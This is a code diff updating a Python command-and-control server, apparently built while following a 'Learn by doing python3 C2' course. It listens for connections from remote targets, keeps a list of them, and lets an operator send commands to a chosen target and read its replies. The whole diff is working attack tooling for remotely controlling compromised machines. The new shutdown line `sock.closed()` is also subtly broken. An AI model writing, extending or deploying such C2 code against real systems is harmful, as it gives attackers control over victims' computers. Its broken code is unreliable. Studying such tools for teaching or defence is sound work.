@@ -24,42 +24,49 @@ def banner():
     print('                                                        Credit to "Learn by doing python3 C2" by The Mayor')
     print('                                                                            https://ko-fi.com/s/0c3776a2a0')
 
-# Comm In Function
-def comm_in(remote_target):
-    print('[+] Awaiting response... ')
-    response = []
-    while True:
-        response.append(remote_target.recv(8192).decode())
-        if not response[-1]:
-            return "".join(response)
+# New Comm In Function
+def comm_in(targ_id):
+    print('[+] Awaiting response.... ')
+    response = targ_id.recv(1024).decode()
+    return response
 
-# Comm_Out Function
-def comm_out(remote_target, message):
-    remote_target.send(message.encode())
+# New Comm Out Function
+def comm_out(targ_id, message):
+    message = str(message)
+    targ_id.send(message.encode())
+
+# Target Comm Update
+def target_comm(targ_id):
+    while True:
+        message = input('Send message#> ')
+        comm_out(targ_id, message)
+        if message == 'exit':
+            targ_id.send(message.encode())
+            targ_id.close()
+            break
+        if message == 'background':
+            break
+        else:
+            response = comm_in(targ_id)
+            if response == 'exit':
+                print('[-] The client has terminated the session.. Bye bye')
+                targ_id.close()
+                break
+            print(response)
 
 # Listener Handler Update
 def listener_handler():
-    sock.bind((host_ip, int(host_port)))
+    sock.bind((host_ip, host_port))
     print('[+] Awaiting connection from client...')
     sock.listen()
     t1 = threading.Thread(target=comm_handler)
     t1.start()
     
-# Listener Handler Function
-# def listener_handler(host_ip, host_port, targets):
-#     sock.bind((host_ip, host_port))
-#     print('[+] Awaiting connection from client...')
-#     sock.listen()
-#     remote_target, remote_ip = sock.accept()
-#     targets.append([remote_target, remote_ip])
-#     print(targets)
-#     print((targets[0])[0])
-#     print((targets[0])[1])
-#     comm_handler(remote_target, remote_ip)
-
 # Comm_Handler update
 def comm_handler():
     while True:
+        if kill_flag == 1:
+            break
         try:
             remote_target, remote_ip = sock.accept()
             targets.append([remote_target, remote_ip[0]])
@@ -68,39 +75,12 @@ def comm_handler():
             pass
 
 
-# Comm_Handler function
-# def comm_handler(remote_target, remote_ip):
-#     print(f'[+] Connection received from {remote_ip[0]}')
-#     while True:
-#         try:
-#             message = input('Message to send#> ')
-#             #Exit message handling
-#             if message == 'exit':
-#                 remote_target.send(message.encode())
-#                 remote_target.close()
-#                 break
-#             remote_target.send(message.encode())
-#             response = remote_target.recv(1024).decode()
-#             if response == 'exit':
-#                 print('[-] Client has terminated the session. Bye bye..')
-#                 remote_target.close()
-#                 break
-#             print(response)
-#         except KeyboardInterrupt:
-#             print('[-] Keyboard interrupt issued.')
-#             message = 'exit'
-#             remote_target.send(message.encode())
-#             sock.close()
-#             break
-#         except Exception:
-#             remote_target.close()
-#             break
-
 
 if __name__ == '__main__':
     sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=32, cols=200))
     targets = []
     banner()
+    kill_flag = 0
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         #host_ip = sys.argv[1]
@@ -129,7 +109,8 @@ if __name__ == '__main__':
                         target_comm(targ_id)
         except KeyboardInterrupt:
             print('\n[-] Keyboard interrupt issued')
-            sock.closed
+            kill_flag = 1
+            sock.closed()
             break
 
 
